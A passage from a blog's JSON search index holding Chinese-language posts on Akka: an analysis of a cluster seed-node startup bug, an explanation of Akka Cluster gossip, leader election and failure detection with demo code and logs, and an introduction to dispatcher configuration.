Props props = ...// this actor uses MyCustomMailbox, which is assumed to be a singletonsystem.actorOf(props.withDispatcher(&quot;myCustomMailbox&quot;).tell(&quot;bang&quot;, sender);assert(MyCustomMailbox.getInstance().getLastEnqueued().equals(&quot;bang&quot;)); 可能会失败；你必须留出一段时间通过并重试检查TestKit.awaitCond。​ 参考https://cloud.tencent.com/developer/article/1435522","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Cluster-Bug分析","slug":"network/akka/Akka-Cluster-Bug分析","date":"2021-12-03T08:21:56.862Z","updated":"2021-12-03T09:07:15.136Z","comments":true,"path":"2021/12/03/network/akka/Akka-Cluster-Bug分析/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Cluster-Bug%E5%88%86%E6%9E%90/","excerpt":"","text":"1.概述 Akka这样一个scala世界里的明星，给我们提供了各种各样吸引人的功能和特性，尤其在分布式、高并发领域。但就像任何其他优秀的框架，它的实现也必然会有其复杂性，在Roland Kuhn(Akka Tech Lead)的带领下,Akka的实现原理吸收了各个领域内成熟、领先的理论。尤其是Akka里cluster的实现，更是体现了非常多的优秀理论和实战经验。 但由于它目前还处在实验阶段，在使用过程中还是会有可能碰到这样或那样的问题，下面就以Akka 2.3为例，详细分析我们碰到的一个bug。 1.1. 场景描述 集群里有两台机器SeedNode1(10.10.10.110) 和 SeedNode2(10.10.10.220)，Akka的配置文件application.conf里相关配置如下: 1seed-nodes = [&quot;akka.tcp://ClusterSystem@10.10.10.110:2551&quot;,&quot;akka.tcp://ClusterSystem@10.10.10.220:2552&quot;] 我们先启动SeedNode1，等一会启动SeedNode2，发现SeedNode2和SeedNode1的TCP链路是连上了，但就是无法正常进行工作。但如果先让SeedNode2先启动，然后再启动SeedNode1，则没有问题，集群可正常启动。 为了更好方便大家理解，下面先介绍一下cluster和remote的相关实现细节，这样才能前后串起来。 2.cluster的启动要使用一个cluster首先要启动它，所以我们先从启动这个步骤的实现开始进行分析。Akka集群的启动首先就是要启动一种叫做种子节点(SeedNode)的节点们。只有种子节点启动成功，其他节点才能选择任意一个种子节点加入集群。 种子节点默认可配置多个，它们之间没有任何区别，种子节点的启动分以下几种情况： 某种子节点启动，它首先判断自己的ip是否在种子节点配置列表中，如果在并且是第一个，则它在一个规定时间内(默认是5秒)，向其他种子节点发送‘InitJoin’消息，如果有确认消息返回，则加入第一个返回确认的种子节点所在的cluster中，否则，它自己将创建一个新的cluster。(这些任务由FirstSeedNodeProcess这个Actor完成，任务完成后它就销毁自己) 某种子节点启动，它首先判断自己的ip是否在种子节点配置中，但不是第一个，则它向其他种子节点发送消息，如果在一个规定时间内(默认是5秒)没有收到任何确认消息，则它将不断重试，直到有一个种子节点返回正确的确认消息，然后就加入这个种子节点所在的cluster中。(这里注意以下，它不会自己创建一个新cluster)。(这些任务由JoinSeedNodeProcess这个Actor完成，任务完成后它就销毁自己) 从上面的分析，我们可以得出下面的一些结论： 一个集群第一次启动成功，那一定是种子节点配置列表中排在第一位的节点，由它来创建出集群。但是随着时间的推移，排在第一的种子节点有可能重启了，那这个时候，它将首选加入到其他种子节点去。 一个种子节点可以加入任何一个其他节点，不用非得都加到排第一位的节点上。 ​ 下面我们举例说明，有种子节点1、2、3： seed2启动, 但是没有收到seed1 或seed3的确认。 seed3启动，没有收到seed1 的确认消息(seed2处在’inactive’状态)。 seed1 启动，创建cluster并加入到自己中。 seed2 重试加入过程，收到seed1的确认, 加入到seed1。 seed3重试加入过程，先收到seed2的确认, 加入到seed2。 ​ 3.remote通讯链路的上行、下行实现3.1 上行路径(listen启动的全过程) 由于上行路径较复杂，所以画了几张图辅助说明： **建立listen 接收新链路请求 接收新链路处于等待握手状态 ** (接收一个新链路处于等待握手状态)**​ _​_可以把Remoting这个非常重要的类作为通讯模块的入口，它在启动的时候(start方法里)会向 EndpointManager这个Actor发送Listen消息，启动底层通讯NettyTransport的listen操作。 ​ **​**由AkkaProtocolTransport类来包一层NettyTransport，所以，先调用的是AkkaProtocolTransport的listen方法，这个方法里产生一个upstreamListenerPromise，这个promise最后会被成赋值为ActorAssociationEventListener(EndpointManager的实例)，而这个promise的作用是为了设置AkkaProtocolManager的associationListener属性为EndpointManager的实例。 ​ _​_NettyTransport在linsten过程中，会返回一个associationListenerPromise，这个promise会通过调用interceptListen方法而被赋值ActorAssociationEventListener(AkkaProtocolManager的实例)。 而这个promise有两个作用： 把建立起来的通讯Channel(监听端口的)置为可读状态(setReadable)，以便接收后续进入的消息。 作为TcpServerHandler的构造参数传入(_associationListenerFuture)，TcpServerHandler实例(它其实是 netty里SimpleChannelUpstreamHandler的一个扩展)里最重要的方法是onConnect这个回调方法。当有外部链接建立成功，onConnect方法会被调用，紧接着会调用initInbound方法，然后在该promise处等待，直到promise被成功赋值。​ _​_当上面initInbound方法里的promise被成功唤醒，它就会调用init方法。 ​ _​_init方法里首先会创建一个TcpAssociationHandle实例(包含一个readHandlerPromise），这个Promise在这里等待被唤醒(它被后面7处的操作唤醒而设置channel(新链接的)置为可读状态(setReadable)，同时在netty中注册该channel的listen为ProtocolStateActor实例)，然后会向AkkaProtocolManager实例发送InboundAssociation消息(这个消息里包含一个TcpAssociationHandle实例)。 ​ _​_AkkaProtocolManager实例收到InboundAssociation消息，创建一个ProtocolStateActor实例(调用inboundProps构造方法)，这个实例的构造函数里包含两个重要的参数TcpAssociationHandle实例、EndpointManager的实例； ​ _​_ProtocolStateActor实例的这种构造方法会把TcpAssociationHandle实例里的readHandlerPromise设置值而唤醒它。 ​ _​_ProtocolStateActor实例初始化后会等待在接受握手的状态中(WaitHandshake)，这个时候如果接收到网络报文，decode后发现是Associate消息，则调用notifyInboundHandler方法。在这个方法中会向EndpointManager实例发送InboundAssociation(new AkkaProtocolHandle(…))消息，notifyInboundHandler方法也创建了一个readHandlerPromise,它作为参数放在发往EndpointManager实例的消息里，然后等待被赋值。 ​ _​_EndpointManager实例收到InboundAssociation消息后，根据addressToWritable(EndpointPolicy规则的集合)进行一些必要的判断，如果符合要求则调用createAndRegisterEndpoint方法，这个方法最主要是创建EndpointWriter实例并注册这个实例。不符合则进行相关动作，如保存这个InboundAssociation消息，等待后续条件合适再处理。 ​ _​_在创建EndpointWriter实例的preStart方法里，判断是否已经存在AkkaProtocolHandle实例，如果已经存在则创建一个EndpointReader实例，并把它作为值设置给步骤7里的readHandlerPromise，使readHandlerPromise这个Promise的future被唤醒。 ​ _​_ProtocolStateActor实例的readHandlerPromise被唤醒后，会向自己发送一条HandleListenerRegistered(EndpointReader实例)的消息，接收到这个消息后，它会修改自己状态机里的状态数据为ListenerReady。后续所有接受的网络数据包就会被正常的decode和分发了。 ​ 3.2.下行路径作为发送端(client)，当seed节点A向seed节点B发送InitJoin消息时，调用链如下： _​_向处在accepting状态中的EndpointManager实例发送’Send(message, senderOption, recipientRef, _)’ ​ _​_EndpointManager实例调用createAndRegisterWritingEndpoint方法，创建一个ReliableDeliverySupervisor实例(在EndpointWriter实例之上封了一层，以加强可靠性)。 并且向addressToWritable这个HashMap里添加一条记录。​ _​_ReliableDeliverySupervisor实例会创建一个EndpointWriter实例，在其preStart方法里，由于传入的AkkaProtocolHandle为None，所以会调用transport.associate(remoteAddress, …)，同时EndpointWriter实例进入Initializing状态。 ​ _​_上面的transport是AkkaProtocolTransport实例，它会向AkkaProtocolManager实例的发送一个AssociateUnderlyingRefuseUid消息 ​ _​_AkkaProtocolManager实例收到AssociateUnderlyingRefuseUid消息后，调用createOutboundStateActor方法，该方法调用ProtocolStateActor.outboundProps的构造方法。 ​ _​_ProtocolStateActor实例的outboundProps构造方法，会调用NettyTransport实例的associate方法，它会调用NettyFutureBridge(bootstrap.connect(socketAddress)进行真正的网络连接。 ​ _​_如果无法成功建立连接，则向外发送异常，这个异常会最终被EndpointManager实例捕获。 ​ ​EndpointManager实例捕获异常后，根据异常情况进行处理，如果是链接失败异常则调用markAsFailed修改addressToWritable相关配置。 ​ ​如果成功建立连接，则InitJoin消息会发送对对方机器。 ​ 3）bug具体原因分析通过上面的cluster集群启动过程的分析和remoting的实现过程，可以用来具体分析一下我们的问题场景。 我们是先启动SeedNode1，它启动后会调用remoting的下行路径向SeedNode2发送 ’InitJoin‘消息，它在发送几次后，还没收到响应则自己创建了集群。等我们再启动SeedNode2的时候，SeedNode2会向SeedNode1发起链接，走的是SeedNode1的上行路径，于是bug发生了。它具体原因就在下行链路的处理环节8###中没有捕获ConnectException异常，也就没有对addressToWritable相关配置进行调整。这就使得上行链路的处理环节9###无法正常往下进行。该bug在今年4月份被修复，2.3.2及其之后的版本都没有问题，具体修复请查看https://github.com/akka/akka/commit/672e7f947c9d4e3499bb3667a7230685546b7f7b，虽然就是新增了一个对ConnectException异常的捕获，但分析这个bug的原因过程，还是有收获的，应该能对使用Akka的remoting、cluster模块的相关朋友有帮助。","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Cluster原理分析","slug":"network/akka/Akka-Cluster原理分析","date":"2021-12-03T08:21:48.776Z","updated":"2021-12-03T09:07:15.112Z","comments":true,"path":"2021/12/03/network/akka/Akka-Cluster原理分析/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Cluster%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","excerpt":"","text":"1. 概述 Akka remoting是Peer-to-Peer的，所以基于remote功能的cluster是一个去中心化的分布式集群。 Akka Cluster将多个JVM连接整合在一起，实现消息地址的透明化和统一化使用管理，集成一体化的消息驱动系统。最终目的是将一个大型程序分割成若干子程序，部署到很多JVM上去实现程序的分布式并行运算（单机也可以起很多节点构成集群）。更重要的是, Akka Cluster集群构建与Actor编程没有直接的联系，集群构建是在ActorSystem层面上，实现了Actor消息地址的透明化，无需考虑目标运行环节是否分布式，可以按照正常的Actor编程模式进行开发。我们知道，分布式集群是由若干节点组成的，那么节点的发现及状态管理是分布式系统一个比较重要的任务。Akka Cluster中将节点的生命周期划分为： joining - 当尝试加入集群时的初始状态 up - 加入集群后的正常状态 leaving / exiting - 节点退出集群时的中间状态 down - 集群无法感知某节点后，将其标记为down removed - 从集群中被删除，以后也无法再加入集群 其实当参数akka.cluster.allow-weakly-up-members启用时(默认是启用的)，还有个weakly up，它是用于集群出现分裂时，集群无法收敛，则leader无法将状态置为up的临时状态。这个后面再解释。图中还有两个特殊的名词： fd* - 这个表示akka的错误检测机制Faiulre Detector被触发后，将节点标记为unreachable unreachable* - unreachable不是一个真正的节点状态，更多的像是一个flag，用来描述集群无法与该节点进行通讯。当错误检测机制侦测到这个节点又能正常通讯时，会移除这个flag。 市面上大多数产品的分布式管理一般用的是注册中心机制，例如zk、consul或etcd。其实是节点把自己的信息注册到所使用的注册中心里，而master通过接受注册中心的通知得知新节点信息。显然本质上是一种master/slave的架构。这种架构有两个问题： master节点一般是单一的，一旦挂了影响就比较大（所以很多master都采用了HA机制），也就是所谓的系统单点故障； 通常节点的地址发现是要走master去获取的，当系统并发大时，master节点就可能成为性能瓶颈，即单点性能瓶颈。 Akka可能就是考虑这两点，采用了P2P的模式，这样任何一个节点都可以作为”master”，任何的节点都可以用来寻找其他节点地址。那它是怎么做到的呢？答案是Gossip协议和CRDT。 2.Akka Gossip2.1.基本介绍2.1.1.Gossip协议Gossip协议简单来说，就是病毒式的将信息扩散到整个集群，无法确定何时完成完全扩散，但最终是会到达完全扩散状态的（最终一致性），即收敛。具体介绍可以参考我转载的一片文章——[P2P 网络核心技术：Gossip 协议](http://edisonxu.com/2018/11/02/gossip.html)，这里就不再重复叙述，着重介绍下Akka是怎么使用Gossip的。 2.1.2.CRDTP2P的分布式系统中，理论上每个节点都能处理外部的请求，以及向其他节点发送请求。而系统中存在的共享变量，可能在同一时间会被两个不同节点的请求用到，即并发安全问题。一般解决方案是队列或自旋，后者本质上还是一种变相的队列。排队就牵扯到两个问题： “谁先来的” 很多人下意识会觉得用时间戳就可以了嘛，但在分布式集群中，每个节点如果是一台单独的服务器，那么每个节点的时间戳未必相同（比如未开启Ntp）。 “同时来的怎么办” 就像git，能merge就merge，不能merge就解决冲突。CRDT就是用于解决解决分布式事件的先后顺序及merge问题的数据结构的简称，即Conflict-Free Replicated Data Types的缩写，它的作用是保证最终一致性，出处参阅这份论文。白话文 谈谈CRDT 和CRDT介绍这两篇文章讲的通俗易懂，多的就不再重复了。Akka中节点的状态就是一个特殊的CRDT，使用向量时钟Vector Clock实现方案，关于向量时钟Vector Clock可以参见我转发的这篇文章Vector Clock/Version Clock。Akka的gossip协议发送的具体内容如下： 1234567891011121314final case class Gossip( members: immutable.SortedSet[Member], // sorted set of members with their status, sorted by address overview: GossipOverview = GossipOverview(), version: VectorClock = VectorClock(), // vector clock version tombstones: Map[UniqueAddress, Gossip.Timestamp] = Map.empty)final case class GossipOverview( seen: Set[UniqueAddress] = Set.empty, reachability: Reachability = Reachability.empty)class Reachability private ( val records: immutable.IndexedSeq[Reachability.Record], val versions: Map[UniqueAddress, Long]) members 存放该节点知道的其他节点 seen 已经收到本次gossip的节点们，每个节点当接受到一个新的gossip消息时，会把自己放到seen里面，作为响应返回给发送者 reachability 这个由错误检测机制Faiulre Detector的心跳模块来维护，用来判断节点是否存活。正常情况下records应该是空的，当有节点处于Unreachable时，才会有记录加到records里。 version 向量时钟，用于冲突检测和处理 2.1.3.种子节点 SeedNodeSeendNode一般是提前配置好的一组节点。它用于接受其他节点（可以是种子节点）的加入集群的请求。不同节点，在Akka Cluster中启动时会有不同的逻辑： 如果是种子节点，并且是排序后的种子节点数组中排第一的，它会在一个规定的时间内(默认5秒)去尝试加入已存在的集群，即发送InitJoin消息到其他种子节点。如果未能成功加入，则自己将创建一个新的Cluster。 如果是种子节点，但并不是数组中排第一的，则会向其他种子节点发送InitJoin消息，如果失败将不断重试，直到能成功加入第一个返回响应的已加入集群的种子节点对应的Cluster。 如果是普通节点，则会向其他种子节点发送InitJoin消息，如果失败将不断重试，直到能成功加入第一个返回响应的已加入集群的种子节点对应的Cluster。 这里有一点值得注意，为什么是加入第一个返回响应的种子节点所在的集群？这个问题后面再解释。 3.过程详解下面用一个简单的场景来解释整个交互过程，假定我们有两个节点n1和n2，其中n1是种子节点。我们让n2先启动。上图中的T0、T1表示时间轴，但只是为了方便将步骤拆解，便于理解。其中T4和T5并没有必然的时间前后关系，这里只是假定T4在前，步骤基本是类似的，T5在前也只是稍有不同。#T0、T1时刻只是为了表明n2在启动时，如果没有种子节点响应，则会一直等待重试#T2时刻种子节点自己新建一个集群，由于新集群只有它自己，members和seen是一样的，所以把自己作为集群的leader。 3.1.leader Gossip协议中没有leader选举过程 leader只是一个角色，任何节点均可以是leader leader的确定非常简单：集群收敛后，当前members队列按IP进行排序，排第一位置的节点就是整个集群的leader leader并非一直不变，如果集群有新节点加入或某节点退出，导致发生Gossip过程，收敛后都会重新确定leader leader的职责是更新节点在集群中的状态以及将集群的成员移入或移出集群 注意，这里有个地方容易被误解：“n1和n2构成一个集群，不是在T5才收敛吗？怎么在T2就确定leader了？”其实当第一个种子节点新建cluster时，由于只有它一个，即seen和members里内容一样，它判断当前集群已收敛，就把自己当作leader了。所以才有了T2_2和T4。#T3时刻是n1响应n2的InitJoin请求，具体交互过程如下：#T3_0种子节点收到n2的Join消息后，会做两件事： 更新当前Gossip的向量时钟； 清空当前Gossip的seen队列，然后把自己加进去。（后续发起Gossip交互时，会优先选择那些没在seen队列中的成员） #T4时刻因为作为fd能正常与n2进行心跳，n1作为leader就被通知将n2提升为Up状态#T5时刻是一个CRDT的对比过程，对比两个Goissp的version，即VectorClock，比较的结果有三种： Same: 相同，则进行seen队列合并就可以了 Before: 本地新，则向对端发送本地的Gossip，本地不变 After: 对端新，则更新本地的Gossip。如果对端的Gossip的seen里没有包含本地，则将自己添加到seen里发送给对端，以减少一次两者间的Gossip交互。 #T5时刻最后集群达到了收敛 3.2 Gossip 收敛从上面的图里可以看到节点初始化时会把自己加入到members里，回传回去，同时，节点在收到新的Gossip时，会把自己加入到seen里面。那么，在一开始，members和seen中的节点数是不同的。当Gossip传递的消息被整个集群都消化掉的时候，可以称作当前集群的Gossip收敛。靠以下条件判断Gossip收敛： 集群中不存在unreachable的节点，或者unreachable的节点应该均处于down或exiting状态 正常节点均处于up或leaving状态，且members里的节点都在seen里，即集群中所有的节点都收到过该Gossip4.代码演示说了那么多文字，Akka Cluster提供了监控ClusterEvent的方法，我们可以用代码来校验下上面的知识。添加依赖12345&lt;dependency&gt; &lt;groupId&gt;com.typesafe.akka&lt;/groupId&gt; &lt;artifactId&gt;akka-cluster_2.12&lt;/artifactId&gt; &lt;version&gt;2.5.17&lt;/version&gt;&lt;/dependency&gt; 首先编写application.conf配置文件 1234567891011121314151617181920212223akka &#123; actor &#123; provider = &quot;cluster&quot; &#125; remote &#123; netty.tcp &#123; hostname = &quot;127.0.0.1&quot; port = 0 &#125; artery &#123; enabled = on canonical.hostname = &quot;127.0.0.1&quot; canonical.port = 0 &#125; &#125; cluster &#123; seed-nodes = [ &quot;akka://ClusterSystem@127.0.0.1:2552&quot;, &quot;akka://ClusterSystem@127.0.0.1:2551&quot; ] &#125;&#125; 然后，编写Actor 12345678910111213141516171819202122232425262728293031public class SimpleClusterListener extends AbstractActor &#123; LoggingAdapter log = Logging.getLogger(getContext().system(), this); Cluster cluster = Cluster.get(getContext().system()); //subscribe to cluster changes @Override public void preStart() throws Exception &#123; cluster.subscribe(self(), ClusterEvent.initialStateAsEvents(), ClusterEvent.MemberEvent.class, ClusterEvent.UnreachableMember.class); log.info(&quot;I&#x27;m about to start! Code: &#123;&#125; &quot;, getSelf().hashCode()); &#125; @Override public void postStop() throws Exception &#123; cluster.unsubscribe(self()); &#125; @Override public Receive createReceive() &#123; return receiveBuilder() .match(ClusterEvent.MemberUp.class, mUp-&gt;log.info(&quot;Member is Up: &#123;&#125;&quot;, mUp.member())) .match(ClusterEvent.UnreachableMember.class, mUnreachable-&gt;log.info(&quot;Member detected as unreachable: &#123;&#125;&quot;, mUnreachable.member())) .match(ClusterEvent.MemberRemoved.class, mRemoved-&gt;log.info(&quot;Member is Removed: &#123;&#125;&quot;, mRemoved.member())) .match(ClusterEvent.LeaderChanged.class, msg-&gt;log.info(&quot;Leader is changed: &#123;&#125;&quot;, msg.getLeader())) .match(ClusterEvent.RoleLeaderChanged.class, msg-&gt;log.info(&quot;RoleLeader is changed: &#123;&#125;&quot;, msg.getLeader())) .match(ClusterEvent.MemberEvent.class, event-&gt;&#123;&#125;) //ignore .build(); &#125;&#125; 最后是启动类 1234567891011121314151617181920212223242526272829public class App &#123; public static void main( String[] args ) &#123; if(args.length==0) startup(new String[] &#123;&quot;2551&quot;, &quot;2552&quot;, &quot;0&quot;&#125;); else startup(args); &#125; public static void startup(String[] ports)&#123; ExecutorService pool = Executors.newFixedThreadPool(ports.length); for(String port : ports)&#123; pool.submit(()-&gt;&#123; // Using input port to start multiple instances Config config = ConfigFactory.parseString( &quot;akka.remote.netty.tcp.port=&quot; + port + &quot;\\n&quot; + &quot;akka.remote.artery.canonical.port=&quot; + port) .withFallback(ConfigFactory.load()); // Create an Akka system ActorSystem system = ActorSystem.create(&quot;ClusterSystem&quot;, config); // Create an system.actorOf(Props.create(SimpleClusterListener.class), &quot;ClusterListener&quot;); &#125;); &#125; &#125;&#125; 这里设置了2552和2551两个种子节点，及一个随机端口启动的普通节点。故意在配置中把2552放到2551前面去。带参数2551作为端口启动程序，命名为Node1，启动后，可以看到它会不断尝试连接提供的种子节点中排第一的2552 12[WARN] [11/07/2018 17:15:13.823] [ClusterSystem-akka.actor.default-dispatcher-5] [akka://ClusterSystem@127.0.0.1:2551/system/cluster/core/daemon/joinSeedNodeProcess-1] Couldn&#x27;t join seed nodes after [2] attempts, will try again. seed-nodes=[akka://ClusterSystem@127.0.0.1:2552][WARN] [11/07/2018 17:15:18.835] [ClusterSystem-akka.actor.default-dispatcher-10] [akka://ClusterSystem@127.0.0.1:2551/system/cluster/core/daemon/joinSeedNodeProcess-1] Couldn&#x27;t join seed nodes after [3] attempts, will try again. seed-nodes=[akka://ClusterSystem@127.0.0.1:2552] 这时带参数2552启动程序，命名为Node2，命令行会打印 12[WARN] [11/07/2018 17:15:13.823] [ClusterSystem-akka.actor.default-dispatcher-5] [akka://ClusterSystem@127.0.0.1:2551/system/cluster/core/daemon/joinSeedNodeProcess-1] Couldn&#x27;t join seed nodes after [2] attempts, will try again. seed-nodes=[akka://ClusterSystem@127.0.0.1:2552][WARN] [11/07/2018 17:15:18.835] [ClusterSystem-akka.actor.default-dispatcher-10] [akka://ClusterSystem@127.0.0.1:2551/system/cluster/core/daemon/joinSeedNodeProcess-1] Couldn&#x27;t join seed nodes after [3] attempts, will try again. seed-nodes=[akka://ClusterSystem@127.0.0.1:2552] Node [akka://&#67;&#108;&#x75;&#x73;&#116;&#x65;&#x72;&#x53;&#121;&#115;&#x74;&#101;&#109;&#64;&#49;&#50;&#55;&#46;&#48;&#x2e;&#x30;&#46;&#49;:2552] is JOINING itself (with roles [dc-default]) and forming new cluster 说明作为排第一的种子节点，它创建了集群并把自己加了进去。Cluster Node [akka://&#x43;&#x6c;&#x75;&#115;&#116;&#x65;&#x72;&#83;&#121;&#x73;&#x74;&#101;&#109;&#64;&#49;&#x32;&#55;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;:2552] dc [default] is the new leader 说明2552变成了leader。Node [akka://&#67;&#108;&#x75;&#115;&#116;&#101;&#114;&#83;&#x79;&#115;&#116;&#101;&#x6d;&#64;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#x31;:2551] is JOINING, roles [dc-default] 2551在尝试加入集群Leader is moving node [akka://&#x43;&#108;&#117;&#115;&#116;&#101;&#x72;&#x53;&#x79;&#115;&#116;&#x65;&#109;&#64;&#49;&#50;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;:2551] to [Up] 2551成功加入了集群，状态变为UpCluster Node [akka://&#67;&#x6c;&#x75;&#115;&#x74;&#101;&#114;&#x53;&#121;&#x73;&#116;&#x65;&#x6d;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#x2e;&#49;:2552] dc [default] is no longer the leader 集群变化导致新一轮Goissp收敛后，leader重新选取，2551的IP比2552小，被选为新的leader。可以从Node1的命令行看到证据： 123[INFO] [11/07/2018 17:18:25.755] [ClusterSystem-akka.actor.default-dispatcher-9] [akka.cluster.Cluster(akka://ClusterSystem)] Cluster Node [akka://ClusterSystem@127.0.0.1:2551] - Cluster Node [akka://ClusterSystem@127.0.0.1:2551] dc [default] is the new leader 我们再起一个参数为2900的，命名为Node3，等到正常启动，三个Node状态都为Up。 2552是集群的创建者 2551是集群的leader 此时，我们把2552重启，会看到2551的命令行中出现Leader is removing unreachable node [akka://&#67;&#x6c;&#x75;&#x73;&#x74;&#x65;&#114;&#x53;&#x79;&#115;&#x74;&#101;&#109;&#64;&#49;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#46;&#49;:2552]，等2552完全启动时，可以看到Welcome from [akka://&#x43;&#108;&#x75;&#115;&#x74;&#x65;&#x72;&#83;&#x79;&#x73;&#116;&#101;&#x6d;&#64;&#x31;&#50;&#55;&#46;&#48;&#46;&#x30;&#46;&#49;:2551]说明2552向2551发送的加入集群的消息，2551给它发送了Welcome消息。2552不再自己创建新的集群。有兴趣的可以在关闭2552的情况下重启node3. 5.进阶其实本来这部分应该放在上面，但是一上来讲理论非常不好消化，至少我个人是如此。所以，我宁愿把好理解的交互步骤放前面，把一些知识点穿插在里面，最后再把无法放进去的干巴巴的理论放最后。 5.1.Akka对于Gossip的优化 如果gossiper(gossip的发送者)和recipient(goissp的接收者)拥有相同版本的Gossip(recipient已包含在seen列表里，并且version也与gossiper的完全一致)，这时Gossip的状态不用再发回给gossiper，减少交互。 akka使用的是push-pull类型gossip的变种，它每次发送的是一个digest值，而非真正的value，recipient收到后先比较版本，只有当它的版本较低时，才会去向gossiper请求真正的值。 默认情况下，集群每1秒进行一次gossip，但如果seen里的节点数少于整个集群1/2，则集群每秒钟会进行3轮gossip，以加速收敛。 在未收敛时，gossiper在选择目标节点时是随机的但带有偏向性(biased gossip)。gossiper会选择在当前版本下不在seen里的节点去交换gossip，并且选择的比例系数较高(经验值400个节点下配置为0.8)。该系数会随着轮数增加而减少，以防止单节点同时间收到过多的gossip请求。recipient对于gossip请求也是放到mailbox里的，在mailbox队列较长时，会移除较早的请求。 当收敛后，目标节点的选择就完全是随机的了，而且只发送非常小的gossip状态的消息。一旦集群发生变化，就会回到上一条所述的带有偏向性的biased gossip。 5.2.Failure Detector机制 职责是定期检查集群中节点是否可用 是The Phi Accrual Failure Detector的实现，是一种解耦了观察与行为的增量式错误检测器。它不会简单的判断节点是否可用，而是通过收集各种数据计算出phi值，通过与设定好的threshold进行对比，判断是否出现错误。 每个节点会根据集群节点的hash有序环确定临近的几个节点进行监控（默认是5个），方便跨机房进行监控，保证集群节点的全覆盖。目标节点每1秒向这些节点发送心跳。 只要有一个monitor认为某节点是unreachable状态，那么该节点就会被集群认为是unreachable 被标记为unreachable的节点，只有在所有的monitor都认为它是reachable时，它才会被重新认为是reachable，leader会重新改变它的状态 5.3.网络分区与集群分区当网络出现异常，比如一个跨两地机房的集群，机房间的网络断了。这时： 原创建集群的种子节点所在的集群，会重新发起biased gossip，直至收敛，确认新的leader，被隔开的那部分节点会被认为是unreachable而最终被踢掉 被隔开的那部分节点，会重新发起biased gossip，其中排序在最前面的种子节点会创建一个新的集群，并产生新的leader。原集群中的那部分失联节点会被认为是unreachable而最终被从新集群踢掉 两个集群最终都恢复正常能对外提供服务，即原来的一个集群在无人干涉的情况下，分裂成了两个集群 当网络恢复后，两个集群会重新发起biased gossip，尝试融合，恢复成一个大集群。 6.总结由此可见，从设计上来说，Akka Cluster是完全去中心化，无单点故障和单点性能瓶颈的，具有天然的分布式容错性和可扩容性。​ 参考http://edisonxu.com/2018/11/07/akka-cluster.html","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Actor-调度器","slug":"network/akka/Akka-Actor-调度器","date":"2021-12-03T07:50:01.756Z","updated":"2021-12-03T09:07:15.160Z","comments":true,"path":"2021/12/03/network/akka/Akka-Actor-调度器/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-%E8%B0%83%E5%BA%A6%E5%99%A8/","excerpt":"","text":"1.依赖调度器（Dispatchers）是 Akka 核心的一部分，这意味着它们也是akka-actor依赖的一部分： 1234567891011121314&lt;!-- Maven --&gt;&lt;dependency&gt; &lt;groupId&gt;com.typesafe.akka&lt;/groupId&gt; &lt;artifactId&gt;akka-actor_2.12&lt;/artifactId&gt; &lt;version&gt;2.5.21&lt;/version&gt;&lt;/dependency&gt;&lt;!-- Gradle --&gt;dependencies &#123; compile group: &#x27;com.typesafe.akka&#x27;, name: &#x27;akka-actor_2.12&#x27;, version: &#x27;2.5.21&#x27;&#125;&lt;!-- sbt --&gt;libraryDependencies += &quot;com.typesafe.akka&quot; %% &quot;akka-actor&quot; % &quot;2.5.21&quot; 2.简介 正如在「[Actor System](https://doc.akka.io/docs/akka/current/general/actor-systems.html)」中所解释的，每个 Actor 都是其子级的监督者，因此每个 Actor 定义了故障处理的监督策略。这一策略不能在 Actor 系统启动之后改变，因为它是 Actor 系统结构的一个组成部分。 Akka 的MessageDispatcher是 Akka Actor “tick”的原因，可以说，它是机器的引擎。所有MessageDispatcher实现也是一个ExecutionContext，这意味着它们可以用于执行任意代码，例如「Futures」。​ 3.默认调度器 每个ActorSystem都将有一个默认的调度器，在没有为 Actor 配置其他内容的情况下使用该调度器。可以配置默认调度器，默认情况下是具有指定default-executor的Dispatcher。如果在传入ExecutionContext的情况下创建ActorSystem，则此ExecutionContext将用作此ActorSystem中所有调度程序的默认执行器。如果没有给定ExecutionContext，它将回退到在akka.actor.default-dispatcher.default-executor.fallback中指定的执行器。默认情况下，这是一个“fork-join-executor”，在大多数情况下，它提供了出色的性能。 ​ 4. 查找调度器调度器实现ExecutionContext接口，因此可以用于运行Future的调用等。 123// this is scala.concurrent.ExecutionContext// for use with Futures, Scheduler, etc.final ExecutionContext ex = system.dispatchers().lookup(&quot;my-dispatcher&quot;); 5. 为 Actor 设置调度器 如果你想给你的 Actor 一个不同于默认的调度器，你需要做两件事，第一件事是配置调度器： 12345678910111213141516171819my-dispatcher &#123; # Dispatcher is the name of the event-based dispatcher type = Dispatcher # What kind of ExecutionService to use executor = &quot;fork-join-executor&quot; # Configuration for the fork join pool fork-join-executor &#123; # Min number of threads to cap factor-based parallelism number to parallelism-min = 2 # Parallelism (threads) ... ceil(available processors * factor) parallelism-factor = 2.0 # Max number of threads to cap factor-based parallelism number to parallelism-max = 10 &#125; # Throughput defines the maximum number of messages to be # processed per actor before the thread jumps to the next actor. # Set to 1 for as fair as possible. throughput = 100&#125; 注释：请注意，parallelism-max不会在ForkJoinPool分配的线程总数上设置上限。这是一个设置，专门讨论池保持运行的热线程数，以减少处理新的传入任务的延迟。你可以在 JDK 的「ForkJoinPool 文档」中了解更多关于并行性的信息。 另一个使用“thread-pool-executor”的示例： 12345678blocking-io-dispatcher &#123; type = Dispatcher executor = &quot;thread-pool-executor&quot; thread-pool-executor &#123; fixed-pool-size = 32 &#125; throughput = 1&#125; 